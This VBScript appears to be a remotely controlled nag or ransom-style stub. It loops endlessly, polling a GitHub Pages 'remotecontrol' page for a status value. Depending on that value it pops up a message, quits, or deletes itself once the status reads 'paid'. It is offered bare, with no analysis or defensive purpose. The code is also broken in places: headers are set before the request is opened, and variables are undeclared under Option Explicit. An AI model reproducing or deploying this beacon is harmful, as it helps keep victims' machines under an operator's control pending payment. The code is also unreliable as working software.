
Option Explicit

Dim url
url = "https://tanjim750.github.io/remotecontrol/"

Dim loopCondition
loopCondition = True

Do While loopCondition
    Dim response, status_input, text_input, status_value, text
    Set response = CreateObject("MSXML2.XMLHTTP")
    
    ' Add cache-control headers to disable caching
    response.SetRequestHeader "Cache-Control", "no-cache, no-store, must-revalidate"
    response.SetRequestHeader "Pragma", "no-cache"
    response.SetRequestHeader "Expires", "0"
    
    On Error Resume Next
    response.open "GET", url, False
    response.send
    On Error Goto 0
    
    If response.status = 200 Then
        Dim html
        html = response.responseText
        
        Dim htmlDocument
        Set htmlDocument = CreateObject("HTMLFile")
        htmlDocument.write html
        htmlDocument.close
        
        Set status_input = htmlDocument.getElementById("status1")
        Set text_input = htmlDocument.getElementById("text1")
        Dim w_shell
        Set w_shell = CreateObject("WScript.Shell")
        
        If Not status_input Is Nothing Then
            status_value = status_input.value
        End If
        
        If Not text_input Is Nothing Then
            text = text_input.innerText
        End If
    End If

    If status_value = "pending" Then 
        MsgBox "hsggsggsggscs"
    ElseIf status_value = "loop" Then
        loopCondition = True
    ElseIf status_value = "donotexecute" Then
        WScript.Quit
    ElseIf status_value = "paid" Then
        Set objFSO = CreateObject("Scripting.FileSystemObject")

        ' Get the path of the current VBScript file
        filePath = WScript.ScriptFullName

        ' Delete the file
        objFSO.DeleteFile(filePath)
    Else
        loopCondition = True
    End If
    
Loop

